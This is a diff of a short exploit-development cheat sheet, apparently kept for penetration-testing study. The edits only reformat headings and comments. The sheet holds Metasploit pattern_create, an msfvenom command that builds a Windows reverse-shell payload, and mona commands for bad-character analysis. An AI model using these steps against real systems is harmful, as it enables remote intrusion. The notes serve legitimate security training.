@@ -18,8 +18,7 @@ Vulnerable Module:
 
 Jump ESP Location:
 
-
-Commands:
+=== Commands ===
 
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500 > pattern
 
@@ -40,10 +39,11 @@ msfvenom -p windows/shell_reverse_tcp LHOST=1 LPORT=443 -f py -e x86/shikata_ga_
 
 
 
-==== Mona Prereqs ====
+==== Mona Prereqs (If using the !mona compare method, run these 2 commands first) ====
+# To be confirmed again if we actually need to do these
 
 # set a working folder
 !mona config -set workingfolder c:\logs\%p
 
-#creates bytearray from 00 to ff
+# Creates bytearray from 00 to ff for comparison
 !mona bytearray
